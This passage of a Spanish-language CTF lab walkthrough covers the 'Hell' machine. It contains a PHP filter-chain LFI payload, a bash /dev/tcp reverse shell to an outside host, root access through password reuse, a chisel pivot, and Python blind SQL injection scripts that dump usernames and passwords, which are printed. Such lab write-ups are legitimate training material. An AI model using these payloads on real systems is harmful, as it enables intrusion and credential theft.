onvert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ademas del payload en el parametro <code class="language-plaintext highlighter-rouge">profile</code> al final agregaremos un parametro <code class="language-plaintext highlighter-rouge">cmd</code> que nos enviara una shell en bash, solo urlencodeando el <code class="language-plaintext highlighter-rouge">&</code> que es igual a <code class="language-plaintext highlighter-rouge">%26</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">&cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.100.85/443 0>%261'  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Enviamos y recibimos la shell como el usuario <code class="language-plaintext highlighter-rouge">www-data</code>, podemos leer la <code class="language-plaintext highlighter-rouge">flag</code> 3</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 192.168.100.91
+</span><span class="ve">www-data@b53f32351e98</span><span class="p">:</span><span class="az">~/html</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)  
+</span><span class="ve">www-data@b53f32351e98</span><span class="p">:</span><span class="az">~/html</span><span class="p">$ hostname -I
+172.17.0.2 
+</span><span class="ve">www-data@b53f32351e98</span><span class="p">:</span><span class="az">~/html</span><span class="p">$ cat flag.txt 
+
+█   █▀▀ █ ▀█ █▀█ █▀▀ █▀▀
+█▄▄ █▀  █ █▄ █▀▄ █▄▄ ██▄
+
+Flag 3: HELL{LF1_F1LT7R_CH41N_G3N3R4T0R}
+
+</span><span class="ve">www-data@b53f32351e98</span><span class="p">:</span><span class="az">~/html</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag4">
+<br><h3 class="post-title">Flag 4</h3>
+<h4 class="post-title">HELL{CR3D3NT14LS_1N_HTP455WD_3H?}</h4><br>
+
+<p class="plain-text">Si miramos los archivos encontramos un <code class="language-plaintext highlighter-rouge">.passwd</code> que contiene un <code class="language-plaintext highlighter-rouge">hash</code> el cual pertenece a la contraseña que hemos utilizado antes para el usuario <code class="language-plaintext highlighter-rouge">beilul</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">www-data@b53f32351e98</span><span class="p">:</span><span class="az">~/html</span><span class="p">$ ls -la
+drwxr-xr-x 1 root root       4096 Feb 16 04:00 </span><span class="az">.</span><span class="p">
+drwxr-xr-x 1 root root       4096 Feb 15 19:03 </span><span class="az">..</span><span class="p">
+-rw-r--r-- 1 root root         45 Feb 16 00:35 .htpasswd
+-rw-r--r-- 1 root root         89 Feb 15 20:38 0bfxgh0st.html
+-rw-r--r-- 1 root root     115199 Feb 15 20:34 </span><span class="sa">0bfxgh0st.jpg</span><span class="p">
+-rw-r--r-- 1 root root         89 Feb 15 20:13 eddiedota.html
+-rw-r--r-- 1 root root     245390 Feb  4 20:35 </span><span class="sa">eddiedota.jpg</span><span class="p">
+-r-Sr--r-- 1 root www-data    184 Feb 16 04:00 </span><span class="err">flag.txt</span><span class="p">
+-rw-r--r-- 1 root root         97 Feb 15 20:33 gatogamer1155.html  
+-rw-r--r-- 1 root root      33411 Jan 10  2022 </span><span class="sa">gatogamer1155.jpg</span><span class="p">
+-rw-r--r-- 1 root root       1836 Feb 16 03:59 index.php
+-rw-r--r-- 1 root root         79 Feb 15 20:46 onyx.html
+-rw-r--r-- 1 root root     179707 Feb 15 20:45 </span><span class="sa">onyx.jpg</span><span class="p">
+-rw-r--r-- 1 root root         85 Feb 16 00:32 s4vitar.html
+-rw-r--r-- 1 root root     182579 Feb 16 00:31 </span><span class="sa">s4vitar.jpg</span><span class="p">
+-rw-r--r-- 1 root root         83 Feb 15 21:07 txhaka.html
+-rw-r--r-- 1 root root      33899 Jan  6 21:30 </span><span class="sa">txhaka.jpg</span><span class="p">
+-rw-r--r-- 1 root root         83 Feb 15 20:39 xdann1.html
+-rw-r--r-- 1 root root     186966 Oct 21  2022 </span><span class="sa">xdann1.jpg</span><span class="p">
+</span><span class="ve">www-data@b53f32351e98</span><span class="p">:</span><span class="az">~/html</span><span class="p">$ cat .htpasswd
+beilul:$apr1$fLBy4Y1e$5pVNuSbmc9kil7JulXfQW0
+</span><span class="ve">www-data@b53f32351e98</span><span class="p">:</span><span class="az">~/html</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al reutilizar la contraseña de la web para el usuario <code class="language-plaintext highlighter-rouge">root</code> esta es valida y nos convertimos en root en la <code class="language-plaintext highlighter-rouge">172.17.0.2</code>, podemos leer la <code class="language-plaintext highlighter-rouge">flag</code> numero 4</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">www-data@b53f32351e98</span><span class="p">:</span><span class="az">~</span><span class="p">$ su root
+Password: webserver2023!
+</span><span class="ve">root@b53f32351e98</span><span class="p">:</span><span class="az">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="ve">root@b53f32351e98</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I
+172.17.0.2
+</span><span class="ve">root@b53f32351e98</span><span class="p">:</span><span class="az">~</span><span class="p"># cat /root/flag.txt
+
+█▀█ █▀█ █▀█ ▀█▀   █▀█ █▀█   █▄ █ █▀█ ▀█▀  
+█▀▄ █▄█ █▄█  █    █▄█ █▀▄   █ ▀█ █▄█  █
+
+Flag 4: HELL{CR3D3NT14LS_1N_HTP455WD_3H?}
+
+</span><span class="ve">root@b53f32351e98</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag5">
+<br><h3 class="post-title">Flag 5</h3>
+<h4 class="post-title">HELL{7H3_B00L34N_15_4150_4_VU1N}</h4><br>
+
+<p class="plain-text">Somos <code class="language-plaintext highlighter-rouge">root</code>, pero estamos en la <code class="language-plaintext highlighter-rouge">172.17.0.2</code> que es un contenedor, podemos usar un binario estatico de <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap">nmap</a> para descubrir hosts, encontramos desde la <code class="language-plaintext highlighter-rouge">.1</code> a la <code class="language-plaintext highlighter-rouge">.3</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">root@b53f32351e98</span><span class="p">:</span><span class="az">~</span><span class="p"># ./nmap -sn 172.17.0.1/24 -oG -  
+Host: 172.17.0.1 ()     Status: Up
+Host: 172.17.0.3 ()     Status: Up
+Host: 172.17.0.2 ()     Status: Up
+</span><span class="ve">root@b53f32351e98</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora escaneamos los <code class="language-plaintext highlighter-rouge">puertos</code> de cada uno de los hosts que encontramos activos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">root@b53f32351e98</span><span class="p">:</span><span class="az">~</span><span class="p"># ./nmap 172.17.0.1-3  
+Nmap scan report for 172.17.0.1
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap scan report for 172.17.0.2
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap scan report for 172.17.0.3
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</span><span class="ve">root@b53f32351e98</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Encontramos varios puertos en los hosts, asi que analizemos nuestra situación actual</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">172.17.0.1: </span><span class="ro">✘
+</span><span class="c1">  - Es la máquina real con la interfaz docker
+  - Ya explotamos el servicio ftp y http
+  - No tenemos credenciales para conectarnos a ssh
+</span><span class="p">
+172.17.0.2: </span><span class="ro">✘
+</span><span class="c1">  - Es la máquina donde estamos actualmente
+  - Somos root, no tiene sentido seguir buscando
+</span><span class="p">
+172.17.0.3: </span><span class="ve">✔
+</span><span class="c1">  - No lo hemos tocado para nada, tiraremos por ahi  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuestro objetivo sera el host <code class="language-plaintext highlighter-rouge">.3</code>, como solo son <code class="language-plaintext highlighter-rouge">2</code> puertos un proxy no es necesario asi que con <code class="language-plaintext highlighter-rouge">chisel</code> solo nos pasaremos el puerto <code class="language-plaintext highlighter-rouge">22</code> y <code class="language-plaintext highlighter-rouge">80</code> a nuestro localhost</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">root@b53f32351e98</span><span class="p">:</span><span class="az">~</span><span class="p"># ./chisel client 192.168.100.85:9999 R:22:172.17.0.3:22 R:80:172.17.0.3:80 &  
+[1] 503
+</span><span class="ve">root@b53f32351e98</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ chisel </span><span class="p">server --reverse --port 9999
+server: Reverse tunnelling enabled
+server: Listening on http://0.0.0.0:9999
+server: session#1: tun: proxy#R:22=>172.17.0.3:22: Listening
+server: session#1: tun: proxy#R:80=>172.17.0.3:80: Listening  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si ahora visitamos la página web en nuestro <code class="language-plaintext highlighter-rouge">localhost</code> podemos ver la página de la <code class="language-plaintext highlighter-rouge">172.17.0.3</code> la cual nos dice que se detecto una <code class="language-plaintext highlighter-rouge">vulnerabilidad</code> asi que se modifico la aplicacion para que solo muestre si la <code class="language-plaintext highlighter-rouge">query</code> se ejecuto ocultando lo demas</p>
+<a href="/hmv/hell/10.png" target="_blank"><div><p><img src="/hmv/hell/10.png"></p></div></a>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">wfuzz</code> para descubrir directorios nos encontramos con la ruta <code class="language-plaintext highlighter-rouge">/admin</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://localhost/FUZZ --hc 404 -t 100  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://localhost/FUZZ
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000003:   </span><span class="az">301</span><span class="p">        9 L      28 W       306 Ch      "admin"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La página es muy sencilla, simplemente recibe un <code class="language-plaintext highlighter-rouge">id</code> de usuario y lo procesa en una query, si se procesa correctamente devuelve el mensaje <code class="language-plaintext highlighter-rouge">Query was successfully</code></p>
+<a href="/hmv/hell/11.png" target="_blank"><div><p><img src="/hmv/hell/11.png"></p></div></a>
+
+<p class="plain-text">Si enviamos como id un <code class="language-plaintext highlighter-rouge">1</code> recibimos el mensaje, si a este le agregamos una <code class="language-plaintext highlighter-rouge">'</code> dejamos de ver el mensaje, significa que la <code class="language-plaintext highlighter-rouge">query sql</code> no se procesa correctamente</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="s">1</span><span class="p">    |   'Query was successfully'  
+</span><span class="s">1'</span><span class="p">   |   ''</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos basarnos en ese estado <code class="language-plaintext highlighter-rouge">booleano</code> para hacer una comparacion, en este caso comparamos el primer caracter de la consulta <code class="language-plaintext highlighter-rouge">database()</code> con los caracteres <code class="language-plaintext highlighter-rouge">a</code> y <code class="language-plaintext highlighter-rouge">e</code>, al hacerlo con <code class="language-plaintext highlighter-rouge">a</code> no devuelve nada, sin embargo al hacerlo con <code class="language-plaintext highlighter-rouge">e</code> vemos el mensaje, esto quiere decir que la primera letra de la base de datos en uso es <code class="language-plaintext highlighter-rouge">e</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="s">1'</span><span class="o"> and </span><span class="p">(</span><span class="o">select </span><span class="p">substr(database(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="s">'a'</span><span class="c1">-- -</span><span class="p">  |  ''
+</span><span class="s">1'</span><span class="o"> and </span><span class="p">(</span><span class="o">select </span><span class="p">substr(database(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="s">'e'</span><span class="c1">-- -</span><span class="p">  |  'Query was successfully'  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aplicando esta logica podemos crear un <code class="language-plaintext highlighter-rouge">script</code> que itere por caracteres y signos sobre cada una de las posiciones de una <code class="language-plaintext highlighter-rouge">query</code> sql que muestre las bases de datos existentes, si en la respuesta vemos el mensaje significa que el caracter es correcto</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
+</span><span class="o">import </span><span class="p">string, requests
+
+characters </span><span class="o">= </span><span class="p">string.ascii_lowercase </span><span class="o">+ </span><span class="p">string.punctuation
+
+bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="s">"Databases"</span><span class="p">)
+
+value </span><span class="o">= </span><span class="s">""
+
+</span><span class="o">for </span><span class="p">db </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">):
+    value </span><span class="o">+=</span><span class="s"> "</span><span class="mi">\n\033</span><span class="s">[0;37m[</span><span class="mi">\033</span><span class="s">[0;34m*</span><span class="mi">\033</span><span class="s">[0;37m] "
+    </span><span class="o">for </span><span class="p">position </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">):
+        </span><span class="o">for </span><span class="p">character </span><span class="o">in </span><span class="p">characters:
+            request </span><span class="o">= </span><span class="p">requests.get(</span><span class="no">f</span><span class="s">"http://127.0.0.1/admin/?id=1' and (select substr(schema_name,</span><span class="p">{position}</span><span class="s">,1) from information_schema.schemata limit </span><span class="p">{db}</span><span class="s">,1)='</span><span class="p">{character}</span><span class="s">'-- -"</span><span class="p">)  
+            </span><span class="o">if </span><span class="s">"Query was successfully" </span><span class="o">in </span><span class="p">request.text:
+                value </span><span class="o">+= </span><span class="p">character
+                bar.status(value)
+
+bar.success(value)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo podemos ver que los caracteres <code class="language-plaintext highlighter-rouge">#&+</code> son falsos positivos asi que los quitamos del script utilizando la función <code class="language-plaintext highlighter-rouge">replace</code> remplazarlos por nada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="az">|</span><span class="p">] Databases:
+    [</span><span class="az">*</span><span class="p">] #&+information  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">characters </span><span class="o">= </span><span class="p">string.ascii_lowercase </span><span class="o">+ </span><span class="p">string.punctuation  
+characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"#"</span><span class="p">, </span><span class="s">""</span><span class="p">)
+characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"&"</span><span class="p">, </span><span class="s">""</span><span class="p">)
+characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"+"</span><span class="p">, </span><span class="s">""</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo ejecutamos de nuevo y logramos enumerar <code class="language-plaintext highlighter-rouge">3</code> bases de datos existentes de las cuales la que mas llama la atención es <code class="language-plaintext highlighter-rouge">creds</code> que puede contener credenciales</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Databases:
+    [</span><span class="az">*</span><span class="p">] information_schema  
+    [</span><span class="az">*</span><span class="p">] creds
+    [</span><span class="az">*</span><span class="p">] example</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Modificamos un poco el script esta vez para poder enumerar todas las <code class="language-plaintext highlighter-rouge">tablas</code> existentes especificamente en la base de datos <code class="language-plaintext highlighter-rouge">creds</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
+</span><span class="o">import </span><span class="p">string, requests
+
+characters </span><span class="o">= </span><span class="p">string.ascii_lowercase </span><span class="o">+ </span><span class="p">string.punctuation
+characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"#"</span><span class="p">, </span><span class="s">""</span><span class="p">)
+characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"&"</span><span class="p">, </span><span class="s">""</span><span class="p">)
+characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"+"</span><span class="p">, </span><span class="s">""</span><span class="p">)
+
+bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="s">"Tables"</span><span class="p">)
+
+value </span><span class="o">= </span><span class="s">""
+
+</span><span class="o">for </span><span class="p">table </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">):
+    value </span><span class="o">+= </span><span class="s">"</span><span class="mi">\n\033</span><span class="s">[0;37m[</span><span class="mi">\033</span><span class="s">[0;34m*</span><span class="mi">\033</span><span class="s">[0;37m] "
+    </span><span class="o">for </span><span class="p">position </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">):
+        </span><span class="o">for </span><span class="p">character </span><span class="o">in </span><span class="p">characters:
+            request </span><span class="o">= </span><span class="p">requests.get(</span><span class="no">f</span><span class="s">"http://127.0.0.1/admin/?id=1' and (select substr(table_name,</span><span class="p">{position}</span><span class="s">,1) from information_schema.tables where table_schema='creds' limit </span><span class="p">{table}</span><span class="s">,1)='</span><span class="p">{character}</span><span class="s">'-- -"</span><span class="p">)  
+            </span><span class="o">if </span><span class="s">"Query was successfully" </span><span class="o">in </span><span class="p">request.text:
+                value </span><span class="o">+= </span><span class="p">character
+                bar.status(value)
+
+bar.success(value)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo solo encontramos una tabla que es <code class="language-plaintext highlighter-rouge">users</code> en la base de datos <code class="language-plaintext highlighter-rouge">creds</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py  
+[</span><span class="ve">+</span><span class="p">] Tables:
+    [</span><span class="az">*</span><span class="p">] users</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Volvemos a modificar el script ahora para enumerar todas las <code class="language-plaintext highlighter-rouge">columnas</code> existentes espeficicamente de la tabla <code class="language-plaintext highlighter-rouge">users</code> que es parte de la base de datos <code class="language-plaintext highlighter-rouge">creds</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
+</span><span class="o">import </span><span class="p">string, requests
+
+characters </span><span class="o">= </span><span class="p">string.ascii_lowercase </span><span class="o">+ </span><span class="p">string.punctuation
+characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"#"</span><span class="p">, </span><span class="s">""</span><span class="p">)
+characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"&"</span><span class="p">, </span><span class="s">""</span><span class="p">)
+characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"+"</span><span class="p">, </span><span class="s">""</span><span class="p">)
+
+bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="s">"Columns"</span><span class="p">)
+
+value </span><span class="o">= </span><span class="s">""</span><span class="p">
+
+</span><span class="o">for </span><span class="p">column </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">):
+    value </span><span class="o">+= </span><span class="s">"</span><span class="mi">\n\033</span><span class="s">[0;37m[</span><span class="mi">\033</span><span class="s">[0;34m*</span><span class="mi">\033</span><span class="s">[0;37m] "
+    </span><span class="o">for </span><span class="p">position </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">):
+        </span><span class="o">for </span><span class="p">character </span><span class="o">in </span><span class="p">characters:
+            request </span><span class="o">= </span><span class="p">requests.get(</span><span class="no">f</span><span class="s">"http://127.0.0.1/admin/?id=1' and (select substr(column_name,</span><span class="p">{position}</span><span class="s">,1) from information_schema.columns where table_schema='creds' and table_name='users' limit </span><span class="p">{column}</span><span class="s">,1)='</span><span class="p">{character}</span><span class="s">'-- -"</span><span class="p">)  
+            </span><span class="o">if </span><span class="s">"Query was successfully" </span><span class="o">in </span><span class="p">request.text:
+                value </span><span class="o">+= </span><span class="p">character
+                bar.status(value)
+
+bar.success(value)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo nos encontramos con solo <code class="language-plaintext highlighter-rouge">2</code> columnas que son <code class="language-plaintext highlighter-rouge">username</code> y <code class="language-plaintext highlighter-rouge">password</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py  
+[</span><span class="ve">+</span><span class="p">] Columns:
+    [</span><span class="az">*</span><span class="p">] username
+    [</span><span class="az">*</span><span class="p">] password</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Creamos una lista con las <code class="language-plaintext highlighter-rouge">columnas</code> e iteramos por cada una de ellas para dumpear sus datos, ademas agregamos <code class="language-plaintext highlighter-rouge">digitos</code> ya que las contraseñas puede que los tengan</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
+</span><span class="o">import </span><span class="p">string, requests
+
+characters </span><span class="o">= </span><span class="p">string.ascii_lowercase </span><span class="o">+ </span><span class="p">string.punctuation </span><span class="o">+ </span><span class="p">string.digits
+characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"#"</span><span class="p">, </span><span class="s">""</span><span class="p">)
+characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"&"</span><span class="p">, </span><span class="s">""</span><span class="p">)
+characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"+"</span><span class="p">, </span><span class="s">""</span><span class="p">)
+
+columns </span><span class="o">= </span><span class="p">[</span><span class="s">"username"</span><span class="p">, </span><span class="s">"password"</span><span class="p">]
+
+</span><span class="o">for </span><span class="p">column </span><span class="o">in </span><span class="p">columns:
+    </span><span class="no">print</span><span class="p">(</span><span class="s">"</span><span class="mi">\r</span><span class="p">"</span><span class="p">)
+    bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="no">f</span><span class="s">"Dumpeando columna </span><span class="p">{column}</span><span class="s">"</span><span class="p">)
+    value </span><span class="o">= </span><span class="s">""
+
+    </span><span class="o">for </span><span class="p">dump </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">):
+        value </span><span class="o">+=</span><span class="s"> "</span><span class="mi">\n\033</span><span class="s">[0;37m[</span><span class="mi">\033</span><span class="s">[0;34m*</span><span class="mi">\033</span><span class="s">[0;37m] "
+        </span><span class="o">for </span><span class="p">position </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">):
+            </span><span class="o">for </span><span class="p">character </span><span class="o">in </span><span class="p">characters:
+                request </span><span class="o">= </span><span class="p">requests.get(</span><span class="no">f</span><span class="s">"http://127.0.0.1/admin/?id=1' and (select substr(</span><span class="p">{column}</span><span class="s">,</span><span class="p">{position}</span><span class="s">,1) from creds.users limit </span><span class="p">{dump}</span><span class="s">,1)='</span><span class="p">{character}</span><span class="s">'-- -"</span><span class="p">)  
+                </span><span class="o">if</span><span class="s"> "Query was successfully" </span><span class="o">in </span><span class="p">request.text:
+                    value </span><span class="o">+= </span><span class="p">character
+                    bar.status(value)
+
+    bar.success(value)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutamos el script y logramos dumpear un total de <code class="language-plaintext highlighter-rouge">3</code> usuarios y <code class="language-plaintext highlighter-rouge">3</code> contraseñas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Dumpeando columna username:  
+    [</span><span class="az">*</span><span class="p">] txhaka
+    [</span><span class="az">*</span><span class="p">] root
+    [</span><span class="az">*</span><span class="p">] marco
+
+[</span><span class="ve">+</span><span class="p">] Dumpeando columna password:  
+    [</span><span class="az">*</span><span class="p">] iamoswe2023!
+    [</span><span class="az">*</span><span class="p">] superrootpassword
+    [</span><span class="az">*</span><span class="p">] beltran48</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esa fue la forma manual aunque realmente podemos usar <code class="language-plaintext highlighter-rouge">sqlmap</code> para explotar la sqli, iniciamos con un <code class="language-plaintext highlighter-rouge">-dbs</code> para listar todas las bases de datos existentes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sqlmap </span><span class="p">--batch --url </span><span class="am">"http://localhost/admin/index.php?id=1"</span><span class="p"> -dbs
+</span><span class="am">        ___
+       __H__
+ ___ ___[</span><span class="ro">,</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.2#stable</span><span class="p">}</span><span class="am">
+|_ -| . [</span><span class="ro">'</span><span class="am">]     | .'| . |
+|___|_  [</span><span class="ro">(</span><span class="am">]_|_|_|__,|  _|
+      |_|V...       |_|   </span><span class="p">https://sqlmap.org
+</span><span class="p">
+[</span><span class="az">22:45:31</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resuming back-end DBMS 'mysql'
+[</span><span class="az">22:45:31</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
